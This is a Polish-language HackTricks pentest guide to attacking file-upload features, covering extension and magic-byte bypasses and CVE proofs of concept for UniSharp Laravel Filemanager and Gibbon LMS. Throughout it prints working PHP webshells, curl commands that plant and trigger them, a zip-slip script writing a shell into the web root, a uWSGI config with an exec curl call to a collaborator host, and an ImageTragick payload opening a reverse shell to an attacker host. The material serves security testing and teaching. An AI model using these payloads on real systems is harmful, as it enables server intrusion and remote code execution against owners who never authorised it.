# Przesyłanie plików

{{#include ../../banners/hacktricks-training.md}}

## Ogólna metodologia przesyłania plików

Inne przydatne rozszerzenia:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Omijanie sprawdzania rozszerzeń plików

1. Jeśli mają zastosowanie, **sprawdź** **poprzednie rozszerzenia.** Przetestuj je także używając **wielkich liter**: _pHp, .pHP5, .PhAr ..._
2. _Sprawdź **dodanie prawidłowego rozszerzenia przed** rozszerzeniem wykonawczym (użyj też poprzednich rozszerzeń):_
- _file.png.php_
- _file.png.Php5_
3. Spróbuj dodać **znaki specjalne na końcu.** Możesz użyć Burp do **bruteforce** wszystkich znaków **ascii** i **Unicode**. (_Uwaga: możesz też spróbować użyć **wcześniej** wspomnianych **rozszerzeń**_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Spróbuj obejść zabezpieczenia **oszukując parser rozszerzeń** po stronie serwera za pomocą technik takich jak **podwajanie** **rozszerzenia** lub **dodawanie śmieciowych** danych (**null** bytes) między rozszerzeniami. _Możesz też użyć **poprzednich rozszerzeń** do przygotowania lepszego payloadu._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Dodaj **kolejną warstwę rozszerzeń** do poprzedniego sprawdzenia:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Spróbuj umieścić **rozszerzenie wykonawcze przed prawidłowym rozszerzeniem** i miej nadzieję, że serwer jest błędnie skonfigurowany. (przydatne do wykorzystania miskonfiguracji Apache, gdzie wszystko z rozszerzeniem .php, nawet jeśli niekoniecznie kończy się na .php, wykona kod):
- _ex: file.php.png_
7. Wykorzystanie **NTFS alternate data stream (ADS)** w **Windows**. W takim przypadku znak dwukropka ":" zostanie wstawiony po zabronionym rozszerzeniu i przed dozwolonym. W rezultacie zostanie utworzony na serwerze **pusty plik z zabronionym rozszerzeniem** (np. "file.asax:.jpg"). Ten plik może być później edytowany za pomocą innych technik, takich jak użycie jego krótkiej nazwy. Wzorzec "**::$data**" może być również użyty do tworzenia plików niepustych. Dlatego dodanie kropki po tym wzorcu może być użyteczne do ominięcia dalszych ograniczeń (np. "file.asp::$data.").
8. Spróbuj przełamać limity nazwy pliku. Prawidłowe rozszerzenie zostaje obcięte. A pozostaje złośliwe PHP. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Niektóre mechanizmy obsługi uploadu przycinają lub normalizują końcowe kropki w zapisanej nazwie pliku. W UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) w wersjach przed 2.9.1 możesz ominąć walidację rozszerzeń przez:

- Użycie prawidłowego MIME obrazu i nagłówka magic (np. PNG’s `\x89PNG\r\n\x1a\n`).
- Nadanie przesyłanemu plikowi rozszerzenia PHP, po którym następuje kropka, np. `shell.php.`.
- Serwer usuwa końcową kropkę i zapisuje `shell.php`, który zostanie wykonany, jeśli zostanie umieszczony w katalogu serwowanym przez WWW (domyślnie public storage like `/storage/files/`).

Minimalny PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Następnie odwiedź zapisaną ścieżkę (typowe w Laravel + LFM):
```
GET /storage/files/0xdf.php?cmd=id
```
Środki zaradcze:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Wymuś rygorystyczne serwerowe allowlists i ponownie zweryfikuj zapisane nazwy plików.
- Serwuj przesłane pliki z lokalizacji, w których nie można uruchamiać kodu.

### Obejście Content-Type, Magic Number, Compression & Resizing

- Obejdź kontrole **Content-Type** przez ustawienie **value** nagłówka **Content-Type** na: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Obejdź sprawdzanie **magic number** przez dodanie na początku pliku **bajtów prawdziwego obrazu** (zmylić polecenie _file_). Albo wprowadzić shell w **metadane**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` lub możesz też **wprowadzić payload bezpośrednio** w obrazie:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- Jeśli do twojego obrazu jest dodawana **kompresja**, na przykład za pomocą standardowych bibliotek PHP takich jak [PHP-GD](https://www.php.net/manual/fr/book.image.php), poprzednie techniki nie będą wtedy przydatne. Jednak możesz użyć **PLTE chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- Strona WWW może również **zmieniać rozmiar** **obrazu**, używając na przykład funkcji PHP-GD `imagecopyresized` lub `imagecopyresampled`. Jednak możesz użyć **IDAT chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Inna technika tworzenia payloadu, który **przetrwa zmianę rozmiaru obrazu**, wykorzystuje funkcję PHP-GD `thumbnailImage`. Jednak możesz użyć **tEXt chunk** [**techniki opisanej tutaj**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) aby wstawić tekst, który **przetrwa kompresję**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Inne triki do sprawdzenia

- Znajdź lukę pozwalającą **zmienić nazwę** już przesłanego pliku (aby zmienić rozszerzenie).
- Znajdź lukę **Local File Inclusion** aby uruchomić backdoor.
- **Możliwe ujawnienie informacji**:
1. Wgraj **wielokrotnie** (i **jednocześnie**) ten **sam plik** o **tej samej nazwie**
2. Wgraj plik o **nazwie** pliku lub folderu, który **już istnieje**
3. Wgranie pliku o nazwie **"." , "..", or "…"**. Na przykład, w Apache na **Windows**, jeśli aplikacja zapisuje przesłane pliki w katalogu "/www/uploads/", nazwa pliku "." utworzy plik o nazwie
uploads” w katalogu "/www/".
4. Wgraj plik, który może być trudny do usunięcia, taki jak **"…:.jpg"** w **NTFS**. (Windows)
5. Wgraj plik w **Windows** z **nieprawidłowymi znakami** takimi jak `|<>*?”` w jego nazwie. (Windows)
6. Wgraj plik w **Windows** używając zarezerwowanych (**zakazanych**) **nazw** takich jak CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Spróbuj również **wgrać plik wykonywalny** (.exe) lub **.html** (mniej podejrzane), który **wykona kod** po przypadkowym otwarciu przez ofiarę.

### Specjalne sztuczki z rozszerzeniami

Jeśli próbujesz przesyłać pliki na **PHP server**, [zobacz trik z **.htaccess** żeby wykonać kod](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
Jeśli próbujesz przesyłać pliki na **ASP server**, [zobacz trik z **.config** żeby wykonać kod](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Pliki `.phar` są jak `.jar` dla java, ale dla php, i mogą być **używane jak plik php** (wykonywane przez php, lub includowane w skrypcie...).

Rozszerzenie `.inc` jest czasami używane dla plików php, które służą jedynie do **importu plików**, więc w pewnym momencie ktoś mógł dopuścić **wykonywanie tego rozszerzenia**.

## **Jetty RCE**

Jeśli możesz przesłać plik XML na serwer Jetty, możesz uzyskać [RCE ponieważ **nowe *.xml i *.war są automatycznie przetwarzane**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Jak pokazano na poniższym obrazku, wgraj plik XML do `$JETTY_BASE/webapps/` i oczekuj shell'a!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

Dla szczegółowego omówienia tej luki sprawdź oryginalne badanie: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Luki Remote Command Execution (RCE) mogą być wykorzystywane w serwerach uWSGI, jeśli atakujący ma możliwość modyfikacji pliku konfiguracyjnego `.ini`. Pliki konfiguracyjne uWSGI wykorzystują specyficzną składnię do wstawiania "magicznych" zmiennych, placeholderów i operatorów. W szczególności operator '@', używany jako `@(filename)`, służy do dołączania zawartości pliku. Spośród różnych obsługiwanych schematów w uWSGI, schemat "exec" jest szczególnie potężny — pozwala na odczyt danych ze standardowego wyjścia procesu. Funkcję tę można manipulować w celach złośliwych, takich jak Remote Command Execution lub Arbitrary File Write/Read, gdy plik konfiguracyjny `.ini` jest przetwarzany.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Wykonanie payload ma miejsce podczas parsowania pliku konfiguracyjnego. Aby konfiguracja została aktywowana i sparsowana, proces uWSGI musi zostać zrestartowany (np. po awarii lub w wyniku Denial of Service) albo plik musi mieć włączony auto-reload. Funkcja auto-reload, jeśli jest aktywna, przeładowuje plik w określonych odstępach po wykryciu zmian.

Ważne jest zrozumienie luźnego podejścia uWSGI do parsowania plików konfiguracyjnych. Konkretnie, omawiany payload może być wstawiony do pliku binarnego (takiego jak obraz lub PDF), co dodatkowo rozszerza zakres potencjalnego wykorzystania.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Nieautoryzowany endpoint w Gibbon LMS umożliwia arbitrary file write wewnątrz web root, prowadząc do pre-auth RCE przez zapisanie pliku PHP. Wersje podatne: do i włącznie 25.0.01.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Required params:
- `img`: data-URI-like string: `[mime];[name],[base64]` (serwer ignoruje type/name, base64-dekoduje końcówkę)
- `path`: destination filename relative to Gibbon install dir (e.g., `poc.php` or `0xdf.php`)
- `gibbonPersonID`: any non-empty value is accepted (e.g., `0000000001`)

Minimal PoC do zapisania i odczytania pliku:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Wgraj minimalny webshell i wykonaj polecenia:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notes:
- Handler wykonuje `base64_decode($_POST["img"])` po podzieleniu przez `;` i `,`, a następnie zapisuje bajty do `$absolutePath . '/' . $_POST['path']` bez walidacji rozszerzenia/typu.
- Wynikowy kod uruchamia się jako użytkownik usługi webowej (np. XAMPP Apache na Windows).

Referencje dla tego buga obejmują usd HeroLab advisory i wpis NVD. Zobacz sekcję References poniżej.

## **wget File Upload/SSRF Trick**

W niektórych przypadkach możesz stwierdzić, że serwer używa **`wget`** do **pobierania plików** i możesz **wskazać** **URL**. W takich sytuacjach kod może sprawdzać, czy rozszerzenie pobieranych plików znajduje się na białej liście, aby zapewnić, że pobierane będą tylko dozwolone pliki. Jednakże, **to sprawdzenie można obejść.**\  
Długość **maksymalna** **filename** w **linux** wynosi **255**, jednak **wget** przycina nazwy plików do **236** znaków. Możesz **pobrać plik o nazwie "A"*232+".php"+".gif"**, ta nazwa pliku **obejdzie** **sprawdzenie** (w tym przykładzie **".gif"** jest **poprawnym** rozszerzeniem), ale `wget` **zmieni nazwę** pliku na **"A"*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Zauważ, że **inną opcją**, o której możesz myśleć, aby obejść tę kontrolę, jest sprawienie, by **HTTP server przekierował do innego pliku**, dzięki czemu początkowy URL obejdzie sprawdzenie, a wget pobierze przekierowany plik pod nową nazwą. To **nie zadziała** **chyba że** wget jest używany z **parametrem** `--trust-server-names`, ponieważ **wget pobierze przekierowaną stronę pod nazwą pliku wskazaną w oryginalnym URL**.

### Ominięcie upload directory za pomocą NTFS junctions (Windows)

(Do tego ataku potrzebny będzie lokalny dostęp do maszyny Windows) Kiedy uploads są przechowywane w podkatalogach per-user na Windows (np. C:\Windows\Tasks\Uploads\<id>\) i kontrolujesz tworzenie/usuwanie tego podfolderu, możesz zastąpić go directory junction wskazującym na wrażliwą lokalizację (np. webroot). Kolejne uploads zostaną zapisane w docelowej ścieżce, co umożliwi wykonanie kodu jeśli target interpretuje server‑side code.

Przykładowy przebieg, aby przekierować uploads do XAMPP webroot:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notatki
- mklink /J creates an NTFS directory junction (reparse point). Konto serwera WWW musi podążać za junction i mieć uprawnienia zapisu w miejscu docelowym.
- This redirects arbitrary file writes; if the destination executes scripts (PHP/ASP), this becomes RCE.
- Defenses: don’t allow writable upload roots to be attacker‑controllable under C:\Windows\Tasks or similar; block junction creation; validate extensions server‑side; store uploads on a separate volume or with deny‑execute ACLs.

## Narzędzia

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) is a powerful tool designed to assist Pentesters and Bug Hunters in testing file upload mechanisms. It leverages various bug bounty techniques to simplify the process of identifying and exploiting vulnerabilities, ensuring thorough assessments of web applications.

### Korrumpowanie indeksów uploadu przez niestandardowe zachowanie snprintf (historyczne)

Niektóre starsze upload handlery, które używają `snprintf()` lub podobnych do budowania tablic multi-file z pojedynczego uploadu, mogą zostać oszukane do sfałszowania struktury `_FILES`. Z powodu niekonsekwencji i obcinania w zachowaniu `snprintf()`, starannie spreparowany pojedynczy upload może wyglądać jak wiele zindeksowanych plików po stronie serwera, wprawiając w błąd logikę, która zakłada ścisły kształt (np. traktując to jako multi-file upload i wybierając niebezpieczne ścieżki). Choć dziś niszowe, wzorzec „index corruption” czasami powraca w CTFach i starszych bazach kodu.

## Od uploadu plików do innych podatności

- Ustaw **filename** na `../../../tmp/lol.png` i spróbuj uzyskać **path traversal**
- Ustaw **filename** na `sleep(10)-- -.jpg` i możesz osiągnąć **SQL injection**
- Ustaw **filename** na `<svg onload=alert(document.domain)>` aby wywołać **XSS**
- Ustaw **filename** na `; sleep 10;` aby przetestować potencjalne command injection (więcej [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Wypróbuj **different svg payloads** z [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Jeśli możesz nakłonić serwer WWW, by pobrał obraz z URL, możesz spróbować nadużyć [SSRF](../ssrf-server-side-request-forgery/index.html). Jeśli ten **image** zostanie **saved** w jakimś **public** serwisie, możesz też wskazać URL z [https://iplogger.org/invisible/](https://iplogger.org/invisible/) i **steal information of every visitor**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- Specjalnie spreparowane PDFy do XSS: Strona [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Jeśli możesz uploadować PDFy, możesz przygotować taki PDF, który wykona dowolny JS zgodnie z podanymi wskazówkami.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Sprawdź, czy istnieje jakiś **size limit** przy uploadowaniu plików

Oto lista top 10 rzeczy, które możesz osiągnąć poprzez upload (źródło: [here](https://twitter.com/SalahHasoneh1/status/1281274120395685889)):

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Rozszerzenie Burp


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Zobacz [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures) dla innych typów plików.

## Zip/Tar File Automatically decompressed Upload

Jeśli możesz wgrać ZIP, który zostanie rozpakowany na serwerze, możesz zrobić dwie rzeczy:

### Symlink

Wgraj archiwum zawierające linki symboliczne do innych plików, a następnie, uzyskując dostęp do rozpakowanych plików, uzyskasz dostęp do tych linkowanych plików:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Rozpakowywanie do różnych folderów

Nieoczekiwane tworzenie plików w katalogach podczas dekompresji to istotny problem. Mimo początkowych założeń, że taka konfiguracja może chronić przed wykonywaniem poleceń na poziomie systemu operacyjnego poprzez złośliwe przesyłanie plików, obsługa hierarchicznej kompresji oraz możliwości directory traversal w formacie archiwum ZIP mogą zostać wykorzystane. Pozwala to atakującym obejść ograniczenia i opuścić bezpieczne katalogi uploadów poprzez manipulację funkcją dekompresji aplikacji docelowej.

An automated exploit to craft such files is available at [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Narzędzie można użyć w następujący sposób:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Dodatkowo, **symlink trick with evilarc** jest opcją. Jeśli celem jest dotarcie do pliku takiego jak `/flag.txt`, należy utworzyć symlink do tego pliku w swoim systemie. To zapewnia, że evilarc nie napotka błędów podczas działania.

Poniżej znajduje się przykład kodu Python używanego do stworzenia złośliwego pliku zip:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Wykorzystywanie kompresji do file spraying**

Po więcej szczegółów **sprawdź oryginalny post**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: Kod PHP jest napisany tak, aby wykonywać polecenia przekazywane przez zmienną `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Tworzone są liczne pliki, a następnie składane jest archiwum zip zawierające te pliki.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Nazwy plików wewnątrz archiwum zip są modyfikowane za pomocą vi lub edytora hex — zamienia się "xxA" na "../", aby przeprowadzić directory traversal.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Prześlij tę zawartość z rozszerzeniem obrazu, aby wykorzystać podatność **(ImageMagick , 7.0.1-1)** (zobacz [https://www.exploit-db.com/exploits/39767](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Osadzanie PHP shell na PNG

Osadzenie PHP shell w IDAT chunk pliku PNG może skutecznie obejść niektóre operacje przetwarzania obrazów. Funkcje `imagecopyresized` i `imagecopyresampled` z PHP-GD są szczególnie istotne w tym kontekście, ponieważ są powszechnie używane do zmiany rozmiaru i resamplowania obrazów. Możliwość, że osadzony PHP shell pozostanie niezmieniony przez te operacje, jest istotną zaletą w pewnych przypadkach użycia.

Szczegółowe omówienie tej techniki, w tym metodologia i potencjalne zastosowania, znajduje się w następującym artykule: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Ten zasób oferuje kompleksowe zrozumienie procesu i jego implikacji.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Pliki polyglotyczne

Pliki polyglot pełnią unikalną rolę w cybersecurity, działając jak kameleony, które mogą jednocześnie istnieć w wielu formatach plików. Intrygującym przykładem jest [GIFAR](https://en.wikipedia.org/wiki/Gifar), hybryda działająca zarówno jako GIF, jak i archiwum RAR. Takie pliki nie ograniczają się do tej pary; możliwe są też kombinacje typu GIF i JS lub PPT i JS.

Główna użyteczność plików polyglot polega na ich zdolności do obchodzenia zabezpieczeń, które filtrują pliki na podstawie typu. W praktyce wiele aplikacji dopuszcza tylko określone typy plików do uploadu — np. JPEG, GIF lub DOC — aby zredukować ryzyko związane z potencjalnie niebezpiecznymi formatami (np. JS, PHP lub Phar). Jednak polyglot, spełniając strukturalne kryteria wielu formatów jednocześnie, może dyskretnie ominąć te ograniczenia.

Pomimo tej elastyczności, polyglots napotykają ograniczenia. Na przykład, chociaż polyglot może jednocześnie zawierać PHAR i JPEG, powodzenie uploadu może zależeć od polityki dotyczącej rozszerzeń plików na danej platformie. Jeśli system jest rygorystyczny względem dozwolonych rozszerzeń, sama strukturalna dualność polyglota może nie wystarczyć, by zapewnić jego przesłanie.

More information in: [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

### Upload valid JSONs like if it was PDF

Jak uniknąć wykrywania typu pliku przesyłając prawidłowy JSON nawet jeśli nie jest dozwolony, udając plik PDF (techniki z **[this blog post](https://blog.doyensec.com/2025/01/09/cspt-file-upload.html)**):

- **`mmmagic` library**: Dopóki magiczne bajty `%PDF` znajdują się w pierwszych 1024 bajtach, jest rozpoznawany jako PDF (patrz przykład w poście)
- **`pdflib` library**: Dodaj fałszywy format PDF wewnątrz pola JSON, aby biblioteka uznała go za pdf (patrz przykład w poście)
- **`file` binary**: Może odczytać do 1048576 bajtów z pliku. Wystarczy stworzyć JSON większy niż ta wartość, żeby nie mógł sparsować zawartości jako json, a następnie wewnątrz JSON umieścić początkową część prawdziwego PDF — wtedy uzna go za PDF

## References

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
- [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
- [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
